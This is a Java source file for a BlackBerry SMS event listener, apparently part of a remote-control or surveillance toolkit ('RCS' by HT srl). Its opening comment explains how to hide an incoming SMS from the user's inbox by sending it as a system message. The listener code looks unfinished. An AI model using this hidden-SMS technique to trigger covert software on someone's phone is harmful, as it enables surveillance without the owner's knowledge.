/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : SmsEvent.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.event;

import java.io.IOException;
import java.io.InterruptedIOException;

import javax.microedition.io.Connector;
import javax.microedition.io.Datagram;
import javax.microedition.io.DatagramConnection;
import javax.wireless.messaging.BinaryMessage;
import javax.wireless.messaging.Message;
import javax.wireless.messaging.MessageConnection;
import javax.wireless.messaging.MessageListener;
import javax.wireless.messaging.TextMessage;

import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;

// TODO: Auto-generated Javadoc
/**
 * To prevent this message from appearing in the BlackBerry device user’s inbox,
 * the sending server should configure the SMS message so that the message type
 * is a system message. This message type can be defined by setting the Protocol
 * Identifier (TP-PID) to 64 (0x40), and the Digital Coding Scheme (TP-DCS) to
 * 244 (0xF4), as shown below: 07913180998000F0040491369740F43080224100238
 * A1168656C6C6F62696E61727974706964363
 * http://www.blackberry.com/knowledgecenterpublic/livelink.exe/fetch/2000/
 * 348583
 * /796557/800451/800563/How_To_-_Use_SMS_to_notify_an_application.html?nodeid
 * =1266974&vernum=0
 * 
 * @author user1
 */
public final class SmsEvent extends Event implements MessageListener {
    // #debug
    private static Debug debug = new Debug("SmsEvent", DebugLevel.VERBOSE);

    // private final boolean stop = false;
    private DatagramConnection dc;
    MessageConnection mc;

    /**
     * Instantiates a new sms event.
     * 
     * @param actionId
     *            the action id
     * @param confParams
     *            the conf params
     */
    public SmsEvent(final int actionId, final byte[] confParams) {
        super(Event.EVENT_SMS, actionId, confParams);

    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    protected void actualRun() {
        try {
            mc = (MessageConnection) Connector.open("sms://:0");
            mc.setMessageListener(this);
        } catch (final IOException e) {
            // #debug
            debug.error(e.toString());
        }

        try {
            mc.close();
        } catch (final IOException e) {
            // #debug
            debug.error(e.toString());
        }
    }

    /**
     * http://www.blackberry.com/knowledgecenterpublic/livelink.exe/fetch/2000/
     * 348583
     * /800451/800563/What_Is_-_Different_ways_to_listen_for_SMS_messages.html
     * ?nodeid=1357551&vernum=0
     */
    protected void actualRunDatagram() {
        // #debug debug
        debug.trace("actualRun");
        try {
            dc = (DatagramConnection) Connector.open("sms://0");

            final Datagram d = dc.newDatagram(dc.getMaximumLength());
            // #debug debug
            debug.trace("waiting to receive sms");
            dc.receive(d);

            final String address = new String(d.getAddress());
            final String msg = new String(d.getData());

            // #debug info
            debug.info("SMS Message received: " + msg);
            // #debug info
            debug.info("From: " + address);

        } catch (final IOException e) {
            // #debug debug
            debug.trace("exception: " + e);
        }
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualStop()
     */
    public synchronized void actualStop() {

        try {
            dc.close(); // Close the connection so the thread returns.
        } catch (final IOException e) {
            // #debug
            debug.error(e.toString());
        }
    }

    /*
     * (non-Javadoc)
     * @see
     * javax.wireless.messaging.MessageListener#notifyIncomingMessage(javax.
     * wireless.messaging.MessageConnection)
     */
    public void notifyIncomingMessage(final MessageConnection conn) {
        Message m;
        try {
            m = mc.receive();

            final String address = m.getAddress();
            String msg = null;
            if (m instanceof TextMessage) {
                final TextMessage tm = (TextMessage) m;
                msg = tm.getPayloadText();
            } else if (m instanceof BinaryMessage) {
                //final StringBuffer buf = new StringBuffer();
                final byte[] data = ((BinaryMessage) m).getPayloadData();

                // convert Binary Data to Text
                msg = new String(data, "UTF-8");
            } else {
                System.out.println("Invalid Message Format");
                System.out.println("Received SMS text from " + address + " : "
                        + msg);
            }
        } catch (final InterruptedIOException e) {
            // #debug
            debug.error(e.toString());
        } catch (final IOException e) {
            // #debug
            debug.error(e.toString());
        }
    }

    /*
     * (non-Javadoc)
     * @see blackberry.event.Event#parse(byte[])
     */
    protected boolean parse(final byte[] confParams) {
              
        return false;
    }

}
